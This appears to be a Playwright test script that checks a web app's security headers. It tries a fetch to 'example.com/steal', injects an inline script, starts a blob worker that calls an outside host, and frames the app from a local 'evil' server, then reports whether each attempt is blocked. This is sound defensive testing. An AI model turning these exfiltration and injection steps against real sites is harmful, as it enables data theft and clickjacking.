import { createServer } from 'node:http'
import { chromium } from 'playwright'
import { serve } from './serve.mjs'

const [profileDir] = process.argv.slice(2)
const server = serve(4009)
const evil = createServer((_q, r) => {
  r.writeHead(200, { 'content-type': 'text/html' })
  r.end('<iframe id=f src="http://127.0.0.1:4009/" style="width:400px;height:400px"></iframe>')
}).listen(4010, '127.0.0.1')
const ctx = await chromium.launchPersistentContext(profileDir)
const p = await ctx.newPage()
await p.goto('http://127.0.0.1:4009/')
await p.waitForFunction(() => window.cvforgeDebug, null, { timeout: 20000 })
const exfil = await p.evaluate(() =>
  fetch('https://example.com/steal?k=1').then(
    () => 'SENT',
    (e) => `blocked (${e.name})`,
  ),
)
console.log('page → other site     :', exfil)
const inline = await p.evaluate(() => {
  window.__ran = false
  const s = document.createElement('script')
  s.textContent = 'window.__ran = true'
  document.body.append(s)
  return new Promise((r) => setTimeout(() => r(window.__ran ? 'RAN' : 'blocked'), 300))
})
console.log('injected inline script:', inline)
const workerOut = await p.evaluate(async () => {
  const w = new Worker(
    URL.createObjectURL(
      new Blob([
        'fetch("https://example.com/").then(()=>postMessage("SENT"),()=>postMessage("blocked"))',
      ]),
    ),
  )
  return new Promise((r) => {
    w.onmessage = (e) => r(e.data)
    w.onerror = () => r('blocked (worker refused)')
    setTimeout(() => r('blocked (no worker)'), 3000)
  })
})
console.log('blob worker → other   :', workerOut)
const viaWorker = await p.evaluate(() =>
  window.cvforgeDebug
    .route(
      '/api/ai/triage',
      { method: 'POST', headers: [['content-type', 'application/json']], body: '{}' },
      () => {},
    )
    .then(
      () => 'route ran',
      (e) => `err ${e.message}`,
    ),
)
console.log('app worker still runs :', viaWorker)
const e = await ctx.newPage()
await e.goto('http://127.0.0.1:4010/')
await e.waitForTimeout(2500)
const frame = e.frames().find((f) => f.url().includes('4009'))
const loaded = frame
  ? await frame.evaluate(() => document.body?.innerText.length ?? 0).catch(() => 0)
  : 0
console.log(
  'framed by another site:',
  loaded > 0 ? `RENDERED (${loaded} chars)` : 'refused (frame-ancestors)',
)
await ctx.close()
server.close()
evil.close()
